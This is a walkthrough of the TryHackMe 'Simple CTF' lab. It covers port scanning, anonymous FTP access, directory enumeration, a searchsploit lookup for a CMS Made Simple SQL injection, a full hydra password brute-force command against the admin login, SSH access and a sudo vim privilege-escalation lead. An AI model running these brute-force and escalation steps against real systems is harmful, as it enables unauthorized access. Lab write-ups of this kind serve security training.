# TRYHACKME : Simple CTF

### PORTS
```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.124.80
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### FTP
```
ftp 10.10.142.72     
Connected to 10.10.142.72.
220 (vsFTPd 3.0.3)
Name (10.10.142.72:miakalifa): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||49641|)
ftp: Can't connect to `10.10.142.72:49641': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
100% |**************************************************************************************************|   166      239.80 KiB/s    00:00 ETA
226 Transfer complete.
166 bytes received in 00:00 (0.40 KiB/s)
ftp> exit
221 Goodbye.
```
**Take note of this important clue:**
```
$ cat ForMitch.txt 
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!\
```

### APACHE 2 CVE

**Start gobuster**
```
$ gobuster dir -u http://10.10.142.72/ -w /usr/share/wordlists/dirb/big.txt 
...
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/robots.txt           (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 300]
/simple               (Status: 301) [Size: 313] [--> http://10.10.142.72/simple/]
Progress: 20469 / 20470 (100.00%)

http://10.10.85.177/simple/admin/login.php
```

```
$ searchsploit -w cms made simple 2.2.8
-------------------------------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                                                    |  URL
-------------------------------------------------------------------------------------------------- --------------------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                          | https://www.exploit-db.com/exploits/46635
-------------------------------------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Results
                                            
```

**Download and run the exploit.** _There are some syntax errors in the python exploit. Fix them first before running_
```

```

**If exploit not working you can alternatively use hyrdra. As you can see from the news section of the home page, a credential named Mitch is a user. We can use it and run hydra**
```
hydra -l mitch -P /usr/share/wordlists/rockyou.txt 10.10.85.177 http-post-form "/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect" -v
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-20 08:43:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.85.177:80/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http[s]://10.10.85.177:80/simple/admin?__c=bf1224b64898192f9a6
[VERBOSE] Page redirected to http[s]://10.10.85.177:80/simple/admin/?__c=bf1224b64898192f9a6
[VERBOSE] Page redirected to http[s]://10.10.85.177:80/simple/admin/login.php
[80][http-post-form] host: 10.10.85.177   login: mitch   password: <PASSWORD>
[STATUS] attack finished for 10.10.85.177 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-20 08:43:44
                                                                                            
```

**We can use the credentials to log in to ther /simple/admin/login.php page of the cms website. But that's really not our goal. Let's instead try it on ssh.**

### SSH
```
$ ls -la
total 36
drwxr-x--- 3 mitch mitch 4096 aug 19  2019 .
drwxr-xr-x 4 root  root  4096 aug 17  2019 ..
-rw------- 1 mitch mitch  178 aug 17  2019 .bash_history
-rw-r--r-- 1 mitch mitch  220 sep  1  2015 .bash_logout
-rw-r--r-- 1 mitch mitch 3771 sep  1  2015 .bashrc
drwx------ 2 mitch mitch 4096 aug 19  2019 .cache
-rw-r--r-- 1 mitch mitch  655 mai 16  2017 .profile
-rw-rw-r-- 1 mitch mitch   19 aug 17  2019 user.txt
-rw------- 1 mitch mitch  515 aug 17  2019 .viminfo
$ cat user.txt
<FLAG>
$ cd ..; ls -la
total 16
drwxr-xr-x  4 root    root    4096 aug 17  2019 .
drwxr-xr-x 23 root    root    4096 aug 19  2019 ..
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
$ cd sunbath
-sh: 5: cd: can't cd to sunbath
$ uname -a
Linux Machine 4.15.0-58-generic #64~16.04.1-Ubuntu SMP Wed Aug 7 14:09:34 UTC 2019 i686 i686 i686 GNU/Linux
```
## PRIVILEGE ESCALATION
```
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

**Go to [GTFOBINS](https://gtfobins.github.io/) and look for the command to compromise vim with sudo privilege.**
```
# find / -name "*.txt" 2>/dev/null
...
// find the most interesting txt
```
